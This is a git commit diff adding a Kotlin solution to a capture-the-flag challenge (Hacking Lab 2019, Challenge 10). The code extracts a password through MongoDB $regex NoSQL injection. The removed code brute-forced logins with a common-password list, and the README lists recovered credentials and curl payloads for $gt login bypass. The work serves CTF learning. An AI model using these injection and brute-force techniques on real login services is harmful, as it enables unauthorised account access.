5f2e699f5f6db8d63dda1c040f63f8119e177f18
Jan Verner <jan.verner@citrix.com>
2019-05-31 14:25:42 +0200

    Add solution for Challenge 10

--- src/main/kotlin/cz/vernjan/he19/ch10/PasswordCracker.kt
+++ src/main/kotlin/cz/vernjan/he19/ch10/PasswordCracker.kt
@@ -1,105 +1,58 @@
 package cz.vernjan.he19.ch10
 
-
-import cz.vernjan.readFile
-import java.math.BigInteger
 import java.net.URI
 import java.net.http.HttpClient
 import java.net.http.HttpRequest
 import java.net.http.HttpRequest.BodyPublishers
 import java.net.http.HttpResponse.BodyHandlers
 import java.time.Duration
-import java.util.concurrent.CompletableFuture
-import java.util.concurrent.Executors
+
+private val CHARS: List<Char> = ('0'..'9') + ('a'..'z') + ('A'..'Z') + '-' + '_'
 
 fun main() {
+    val username = "null"
+    val passwordTemplate = """{"${'$'}regex": "^N0SQL_injections_are_[X].*${'$'}"}"""
+    val passwordChars = mutableListOf<Char>()
 
-    guessLogins()
+    for (i in (0..32)) {
+        for (char in CHARS) {
+            val partialPassword = passwordChars.joinToString(separator = "") + char
+            val guess = PasswordCrackerClient.login(username, passwordTemplate.replace("[X]", partialPassword))
 
-//    guessQuestions()
-}
-
-private fun guessLogins() {
-    val usernames = listOf("no_one", "the_admin", "null", "the_bean", "hax0r")
-    val passwords = readFile("ch10/10-million-password-list-top-1000.txt").split("\n")
-
-    val futures = mutableListOf<CompletableFuture<Void>>()
-
-    PasswordCrackerClient().use { client ->
-        for (username in usernames)
-            for (password in passwords) {
-                futures.add(client.guessLogin(username, password))
+            if (guess) {
+                passwordChars.add(char)
+                if (PasswordCrackerClient.login(username, "\"$partialPassword\"")) {
+                    println("The password is $partialPassword")
+                    System.exit(0)
+                } else {
+                    println("Partial password is $partialPassword")
+                }
+                break
             }
-
-        CompletableFuture.allOf(*futures.toTypedArray()).join()
+            Thread.sleep(25)
+        }
     }
 }
 
-private fun guessQuestions() {
-    PasswordCrackerClient().use { client ->
-        val futures = (0..256)
-                .map { BigInteger("5cc9619fb135c70015b79700", 16).add(BigInteger.valueOf(it.toLong())) }
-                .map { client.guessQuestion(it.toString(16)) }
-                .toTypedArray()
-
-        CompletableFuture.allOf(*futures).join()
-    }
-}
-
-class PasswordCrackerClient : AutoCloseable {
-
-    private val executorForHttpClient = Executors.newFixedThreadPool(10)
+object PasswordCrackerClient {
 
     private val httpClient = HttpClient.newBuilder()
-            .version(HttpClient.Version.HTTP_1_1)
-            .executor(executorForHttpClient)
+        .version(HttpClient.Version.HTTP_1_1)
+        .build()
+
+    fun login(username: String, password: String): Boolean {
+        val body = """ {"username": "$username", "password": $password } """
+        val request = HttpRequest.newBuilder()
+            .POST(BodyPublishers.ofString(body))
+            .header("Content-Type", "application/json")
+            .uri(URI.create("http://whale.hacking-lab.com:3371/login"))
+            .timeout(Duration.ofSeconds(10))
             .build()
 
-    fun guessLogin(username: String, password: String): CompletableFuture<Void> {
-        val request = HttpRequest.newBuilder()
-                .POST(BodyPublishers.ofString("username=$username@stackunderflow.com&password=$password"))
-                .header("Content-Type", "application/x-www-form-urlencoded")
-                .uri(URI.create("http://whale.hacking-lab.com:3371/login"))
-                .timeout(Duration.ofSeconds(10))
-                .build()
+        val response = httpClient.send(request, BodyHandlers.ofString())
+        println("Testing $password: ${response.statusCode()}")
 
-//        println("Sending $username / $password")
-        Thread.sleep(100)
-
-        return httpClient.sendAsync(request, BodyHandlers.ofString())
-                .thenAccept { response ->
-                    if (!response.body().contains("Unknown user")) {
-                        println("Heey! $username / $password")
-                    } else {
-                        println("No luck for  $username / $password")
-                    }
-                }
-                .exceptionally { print("Exc $it"); guessLogin(username, password); null }
+        return response.statusCode() == 302
     }
 
-    fun guessQuestion(questionId: String): CompletableFuture<Void> {
-        val request = HttpRequest.newBuilder()
-                .GET()
-                .uri(URI.create("http://whale.hacking-lab.com:3371/questions/$questionId"))
-                .timeout(Duration.ofSeconds(10))
-                .build()
-
-//        println("Sending $request")
-        Thread.sleep(100)
-
-        return httpClient.sendAsync(request, BodyHandlers.ofString())
-                .thenAccept { response ->
-                    if (!response.body().contains("Unknown question!")) {
-                        println("Heey! $questionId")
-                    } else {
-                        println("No luck for  $questionId")
-                    }
-                }
-                .exceptionally { println(it); null }
-    }
-
-
-    override fun close() {
-        executorForHttpClient.shutdown()
-    }
 }
--- src/main/kotlin/cz/vernjan/he19/ch10/README.md
+++ src/main/kotlin/cz/vernjan/he19/ch10/README.md
@@ -35,3 +35,20 @@ curl http://example.com:8080/endpoint?name=Itchy&name=Scratchy
 Cookies
 
 https://medium.com/bugbountywriteup/celestial-a-node-js-deserialization-hackthebox-walk-through-c71a4da14eaa
+
+5ce77d7caecd0f0015ce8500
+5ce77d7caecd0f0015ce84fa
+
+Passwords
+
+the_admin / 76eKxMEQFcfG3fP
+null N0SQL_injections_are_a_thing
+
+
+https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html
+
+
+curl -v -X POST -H "Content-Type: application/json" -d '{ "username": {"$gt": ""}, "password": {"$gt": ""} }' http://whale.hacking-lab.com:3371/login
+
+curl  -H "Content-Type: application/json" -d '{ "username": "the_admin", "password": {"$regex": "^[a-zA-Z_]*$"} }' http://whale.hacking-lab.com:3371/login
+
